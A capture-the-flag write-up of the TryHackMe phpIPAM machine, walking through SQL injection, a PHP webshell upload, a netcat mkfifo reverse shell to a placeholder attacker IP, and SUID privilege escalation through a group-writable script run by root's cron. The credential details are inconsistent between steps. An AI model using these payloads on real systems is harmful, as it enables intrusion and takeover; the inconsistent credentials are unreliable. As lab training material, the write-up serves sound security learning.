# phpIPAM — TryHackMe Writeup

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Tags:** Web, SQL Injection, File Upload, Privilege Escalation

---

## Summary

This machine involved discovering a phpIPAM instance on a non-standard port, using a SQL injection exploit to gain admin credentials, uploading a PHP webshell via an authenticated vulnerability, and escalating privileges by writing to a root-owned writable binary.

---

## Reconnaissance

Started with a standard nmap scan:

```bash
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

Found two interesting ports:

- **Port 80** — default web page
- **Port 1337** — phpIPAM instance

Navigating to `http://<TARGET_IP>:1337` revealed a phpIPAM login page. The version was identified as **1.4.4** from the page footer.

---

## Foothold — SQL Injection (CVE for phpIPAM 1.4.4)

Searching for known vulnerabilities revealed a SQL injection exploit affecting phpIPAM **1.4.4**. Version 1.4.5 was also present but its exploit path didn't work in this context.

The SQLi exploit allowed extraction of credentials from the database:

```
Username: admin
Password: OllieUnixMontgomery!
```

Logged into phpIPAM successfully.

---

## Webshell Upload

phpIPAM 1.4.4 has an authenticated file upload vulnerability. Using a Python exploit script:

```bash
python3 exploit.py -u admin -p olliepassword -f /etc/passwd
```

This confirmed Remote Code Execution by reading `/etc/passwd`. Next, a PHP webshell was uploaded:

```php
<?php system($_GET['cmd']); ?>
```

Verified execution:

```
http://<TARGET_IP>:1337/path/to/shell.php?cmd=id
# uid=33(www-data) gid=33(www-data)
```

---

## Reverse Shell

Located `nc` on the target:

```bash
cmd=which nc
# /usr/bin/nc
```

Set up a listener:

```bash
nc -lvp 4444
```

Triggered the reverse shell via the webshell:

```bash
cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Got a shell as `www-data`.

---

## Lateral Movement — User Flag

The credentials found earlier (`ollie:olliepassword`) were reused for the system user:

```bash
su ollie
# or SSH directly
ssh ollie@<TARGET_IP>
```

Retrieved the user flag:

```bash
cat /home/ollie/user.txt
```

---

## Privilege Escalation

### Failed attempts

- **pkexec (PwnKit / CVE-2021-4034)** — patched on this machine
- **sudo -l** — no sudo rights for ollie

### Finding a writable binary

Searched for writable files in standard binary paths:

```bash
find /usr/bin /usr/sbin /bin /sbin -writable -type f 2>/dev/null
```

Output:

```
/usr/bin/feedme
```

Checking the file:

```bash
ls -la /usr/bin/feedme
# -rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme

cat /usr/bin/feedme
# #!/bin/bash
# # This is weird?
```

The file is **owned by root** but **writable by the ollie group**. This means any command appended to it will execute as root when the script is triggered by root (e.g. via a cron job).

### Exploitation

Appended a SUID bit payload to the script:

```bash
echo 'chmod +s /bin/bash' >> /usr/bin/feedme
```

Waited for root's cron job to execute `/usr/bin/feedme`. After the job ran:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

`/bin/bash` now had the SUID bit set. Spawned a root shell:

```bash
/bin/bash -p
bash-5.0# whoami
root
```

### Root flag

```bash
bash-5.0# cat /root/root.txt
THM{Ollie_Luvs_Chicken_Fries}
```

---

## Vulnerability Summary

|Step|Technique|Detail|
|---|---|---|
|Credential extraction|SQL Injection|phpIPAM 1.4.4 unauthenticated SQLi|
|RCE|Authenticated file upload|phpIPAM admin panel webshell|
|Lateral movement|Credential reuse|www-data → ollie via SSH/su|
|Privilege escalation|Writable root-owned binary|`/usr/bin/feedme` group-writable, triggered by root cron|

---

## Key Takeaways

- Non-standard ports (1337) are worth thorough enumeration
- Version numbers on web apps directly map to public exploits — always check
- Credentials from one service are frequently reused on the OS
- `find -writable` in system binary paths is a fast and often overlooked privesc check
- A file owned by root but **group-writable** is effectively a privilege escalation primitive if any privileged process runs it